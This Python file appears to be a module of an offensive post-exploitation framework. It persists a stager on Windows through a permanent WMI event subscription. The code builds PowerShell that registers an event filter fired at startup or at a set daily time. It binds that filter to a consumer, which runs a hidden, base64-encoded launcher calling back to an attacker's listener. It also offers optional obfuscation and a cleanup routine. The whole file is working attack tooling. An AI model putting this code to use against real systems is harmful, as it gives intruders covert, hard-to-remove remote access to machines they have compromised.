import os
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-WMI',

            'Author': ['@mattifestation', '@harmj0y'],

            'Description': ('Persist a stager (or script) using a permanent WMI subscription. This has a difficult detection/removal rating.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DailyTime' : {
                'Description'   :   'Daily time to trigger the script (HH:mm).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'AtStartup' : {
                'Description'   :   'Switch. Trigger script (within 5 minutes) of system startup.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'SubName' : {
                'Description'   :   'Name to use for the event subscription.',
                'Required'      :   True,
                'Value'         :   'Updater'
            },                      
            'ExtFile' : {
                'Description'   :   'Use an external file for the payload instead of a stager.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Cleanup' : {
                'Description'   :   'Switch. Cleanup the trigger and any script from specified location.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        listenerName = self.options['Listener']['Value']
        
        # trigger options
        dailyTime = self.options['DailyTime']['Value']
        atStartup = self.options['AtStartup']['Value']
        subName = self.options['SubName']['Value']

        # management options
        extFile = self.options['ExtFile']['Value']
        cleanup = self.options['Cleanup']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        statusMsg = ""
        locationString = ""

        if cleanup.lower() == 'true':
            # commands to remove the WMI filter and subscription
            script = "Get-WmiObject __eventFilter -namespace root\subscription -filter \"name='"+subName+"'\"| Remove-WmiObject;"
            script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='"+subName+"'\" | Remove-WmiObject;"
            script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '"+subName+"'} | Remove-WmiObject;"
            script += "'WMI persistence removed.'"
            if obfuscate:
                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
            return script

        if extFile != '':
            # read in an external file as the payload and build a 
            #   base64 encoded version as encScript
            if os.path.exists(extFile):
                f = open(extFile, 'r')
                fileData = f.read()
                f.close()

                # unicode-base64 encode the script for -enc launching
                encScript = helpers.enc_powershell(fileData)
                statusMsg += "using external file " + extFile

            else:
                print helpers.color("[!] File does not exist: " + extFile)
                return ""

        else:
            if listenerName == "":
                print helpers.color("[!] Either an ExtFile or a Listener must be specified")
                return ""

            # if an external file isn't specified, use a listener
            elif not self.mainMenu.listeners.is_listener_valid(listenerName):
                # not a valid listener, return nothing for the script
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""

            else:
                # generate the PowerShell one-liner with all of the proper options set
                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                
                encScript = launcher.split(" ")[-1]
                statusMsg += "using listener " + listenerName

        # sanity check to make sure we haven't exceeded the powershell -enc 8190 char max
        if len(encScript) > 8190:
            print helpers.color("[!] Warning: -enc command exceeds the maximum of 8190 characters.")
            return ""

        # built the command that will be triggered
        triggerCmd = "$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc " + encScript
        
        if dailyTime != '':
            
            parts = dailyTime.split(":")
            
            if len(parts) < 2:
                print helpers.color("[!] Please use HH:mm format for DailyTime")
                return ""

            hour = parts[0]
            minutes = parts[1]

            # create the WMI event filter for a system time
            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='"+subName+"';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = "+hour+" AND TargetInstance.Minute= "+minutes+" GROUP WITHIN 60\"};"
            statusMsg += " WMI subscription daily trigger at " + dailyTime + "."

        else:
            # create the WMI event filter for OnStartup
            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='"+subName+"';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
            statusMsg += " with OnStartup WMI subsubscription trigger."


        # add in the event consumer to launch the encrypted script contents
        script += "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='"+subName+"';CommandLineTemplate=\""+triggerCmd+"\";RunInteractively='false'};"

        # bind the filter and event consumer together
        script += "Set-WmiInstance -Namespace \"root\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;"


        script += "'WMI persistence established "+statusMsg+"'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
